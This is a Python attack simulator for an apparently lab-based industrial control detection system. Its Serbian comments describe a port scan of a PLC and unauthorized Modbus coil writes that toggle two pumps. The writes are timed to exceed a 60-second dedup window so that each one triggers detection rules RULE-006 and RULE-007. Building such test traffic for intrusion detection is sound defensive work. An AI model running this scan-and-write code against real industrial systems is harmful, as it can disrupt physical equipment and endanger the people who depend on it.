# attacker/attacks.py
"""
attacks.py — NAPADAC ZA TESTOVE (rogue-sim, .99)

Izvodi dva napada pa staje:
  1. skeniranje portova PLC-a (izvidjanje) -> RULE-006
  2. neovlasceni Modbus upis u pumpu       -> RULE-007 (+ korelacija)

Radi samo kad se pusti (za testove), nije stalni servis.
"""

import asyncio
import os
import socket

from pymodbus.client import AsyncModbusTcpClient


TARGET = os.environ.get("TARGET_HOST", "192.168.10.10")
SCAN_PORTS = [21, 22, 23, 25, 80, 102, 135, 443, 445, 502, 1433, 3306, 3389, 8080, 8443]

COIL_PUMPA1 = 0
COIL_PUMPA2 = 1


async def port_scan():
    """Napad 1: pokusaj vezu na mnogo portova (izvidjanje)."""
    print(f"[NAPADAC] Skeniram portove na {TARGET}...")
    for port in SCAN_PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET, port))
            print(f"[NAPADAC]   port {port} otvoren")
            s.close()
        except Exception:
            pass
    print("[NAPADAC] Skeniranje gotovo.")


async def unauthorized_write():
    """
    Napad 2: neovlasceni Modbus upisi, razmaknuti > dedup prozora (60s),
    da svaki bude zaseban alarm.

    Posto plant primenjuje upis na stanje pumpe (procitaj_komande_iz_kutijica),
    upis koji MENJA stanje -> pumpa se pomeri -> korelacija vidi promenu -> CRITICAL.
    Upis koji pise vrednost koju pumpa vec ima -> nema promene -> ostaje HIGH.
    Napadac ne zna stanje, pa je mesavina realna i bas to korelacija razlikuje.
    """
    print(f"[NAPADAC] Neovlasceni upisi u {TARGET}:502 (razmaknuti)...")
    client = AsyncModbusTcpClient(TARGET, port=502)
    await client.connect()
    if not client.connected:
        print("[NAPADAC]   ne mogu da se povezem na Modbus")
        return

    upisi = [
        (COIL_PUMPA1, True),
        (COIL_PUMPA2, True),
        (COIL_PUMPA1, False),
        (COIL_PUMPA2, False),
        (COIL_PUMPA1, True),
        (COIL_PUMPA2, True),
    ]

    RAZMAK = 70  # > dedup prozor (60s), da svaki upis bude zaseban red

    for i, (coil, vrednost) in enumerate(upisi):
        await client.write_coil(coil, vrednost)
        print(f"[NAPADAC]   upis {i+1}/{len(upisi)}: coil {coil} = {vrednost}")
        if i < len(upisi) - 1:
            await asyncio.sleep(RAZMAK)

    client.close()
    print("[NAPADAC] Upisi gotovi.")


async def main():
    attack = os.environ.get("ATTACK", "all")

    if attack in ("scan", "all"):
        await port_scan()
        await asyncio.sleep(2)

    if attack in ("write", "all"):
        await unauthorized_write()

    print("[NAPADAC] Svi napadi zavrseni.")


if __name__ == "__main__":
    asyncio.run(main())